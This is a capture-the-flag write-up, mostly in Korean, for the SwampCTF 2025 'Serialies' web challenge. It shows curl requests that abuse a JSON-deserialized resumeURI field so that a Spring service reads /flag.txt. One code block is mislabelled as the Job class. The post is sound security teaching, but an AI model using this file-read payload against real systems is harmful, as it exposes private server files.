# 🐊 SwampCTF 2025 Writeup - [Serialies]

**Category:** [Web]  
**Points:** [20]  
**Tags:** `CTF`, `[Web]`, `swampctf`  

---
## 📚 Table of Contents
- [🔍 Recon](#-recon)
- [🎯 The Goal](#-the-goal)
- [💉 Exploit](#-exploit)
- [🍪 Info Leakage or Gain](#-info-leakage-or-gain)
- [👑 Accessing the Flag](#-accessing-the-flag)
- [🧠 Conclusion](#-conclusion)

---

## 🔍 Recon

![문제 웹](./Pasted%20image%20250403002659.png)
- 문제 웹 페이지와 소스코드 제공됨

---

## 🎯 The Goal

> 플래그를 얻기 위해 해야 할 주요 목표 정리

- [ ] 시스템 정보 수집
- [ ] 역직렬화 + 파일 읽기 취약점 유도

---

## 💉 Exploit

### 🛠️Step 1. 웹 페이지 접속 및 분석

![문제 웹](./Pasted%20image%20250403002722.png)
```html
<html>
  <body>
    <h1>Whitelabel Error Page</h1>
    <p>
      This application has no explicit mapping for <code>/error</code>,  
      so you are seeing this as a fallback.
    </p>
    <div id="created">Wed Apr 02 02:18:16 UTC 2025</div>
    <div>
      There was an unexpected error (type=Not Found, status=404).
    </div>
  </body>
</html>

```

👉 별다른 정보 없음

### 🛠️Step 2. 소스코드 분석

📁 `\src\main\java\com\serialies\serialies\PersonController.java`
```java
...
@RestController
@RequestMapping("/api/person")
public class PersonController {

    private List<Person> persons = new ArrayList<>();

    @PostMapping
    public String createPerson(@RequestBody Person person) {
        if (person.getAddress() == null) {
            throw new IllegalArgumentException("Address is required");
        }
        if (person.getJob() != null) {
            try {
                person.getJob().init();
            } catch (IOException e) {
                throw new RuntimeException("Error", e);
            }
        }
        persons.add(person);
        return "Person has been created with ID: " + person.getId();
    }

    @GetMapping
    public List<Person> getAllPersons() {
        return persons;
    }

    @GetMapping("/{id}")
    public Person getPersonById(@PathVariable UUID id) {
        Optional<Person> person = persons.stream().filter(p -> p.getId().equals(id)).findFirst();
        if (person.isPresent()) {
            return person.get();
        } else {
            throw new RuntimeException("Person not found with ID: " + id);
        }
    }
}

```

- `/api/person` 경로 확인됨
- `POST` 요청 시 `job.init()` 호출이 핵심
```java
if (person.getJob() != null) {
    person.getJob().init();
}
```
### 🛠️Step 3. /api/person 경로 접속

![문제 웹](./Pasted%20image%20250403002800.png)

페이지 접속 후 flag 값 획득 가능
하지만 해당 방법으로 푸는 것은 아니라고 판단 후 다시 문제를 확인 

### 🛠️Step 4. PersonController 분석

**POST 요청**
```java
...
@RestController
@RequestMapping("/api/person")
public class PersonController {

    private List<Person> persons = new ArrayList<>();

    @PostMapping
    public String createPerson(@RequestBody Person person) {
        if (person.getAddress() == null) {
            throw new IllegalArgumentException("Address is required");
        }
        if (person.getJob() != null) {
            try {
                person.getJob().init();
            } catch (IOException e) {
                throw new RuntimeException("Error", e);
            }
        }
        persons.add(person);
        return "Person has been created with ID: " + person.getId();
    }
```

**`init()`Job 클래스**
```java
    @GetMapping
    public List<Person> getAllPersons() {
        return persons;
    }

    @GetMapping("/{id}")
    public Person getPersonById(@PathVariable UUID id) {
        Optional<Person> person = persons.stream().filter(p -> p.getId().equals(id)).findFirst();
        if (person.isPresent()) {
            return person.get();
        } else {
            throw new RuntimeException("Person not found with ID: " + id);
        }
    }
}
```

- Job 객체가 `resumeURI` 값을 가지고 있고,
- `init()` 내에서 해당 경로의 파일을 열어봄 → **LFI 가능**

### 🛠️Step 5. Exploit

#### 📨 POST 요청
```
curl -X POST http://chals.swampctf.com:44444/api/person \
  -H "Content-Type: application/json" \
  -d '{
    "id": "11111111-1111-1111-1111-111111111111",
    "address": "somewhere",
    "job": {
      "resumeURI": "/flag.txt"
    }
}'
```

#### 🔎 GET 요청
```
curl http://chals.swampctf.com:44444/api/person/11111111-1111-1111-1111-111111111111
```

![문제 웹](./Pasted%20image%20250403002852.png)
👉 flag 확인 성공

#### 🛠️ 사용한 도구
  - [ ] curl

---

## 🍪 Info Leakage or Gain

- Java Jackson 기반 역직렬화 취약점
- @class 타입을 안전하지 않게 사용

---

## 👑 Accessing the Flag

```
swampCTF{f1l3_r34d_4nd_d3s3r14l1z3_pwn4g3_x7q9z2r5v8}
```

---

## 🧠 Conclusion

- **안전하지 않은 직렬화 방법** + **파일 읽기 취약점**
- JSON을 통해 직렬화된 객체를 그대로 받아들임
- `resumeURI` 값을 기반으로 서버가 **파일 내용을 자동으로 읽음**

---

_📚 Writeup by [@ChaeYum1](https://github.com/ChaeYum1)_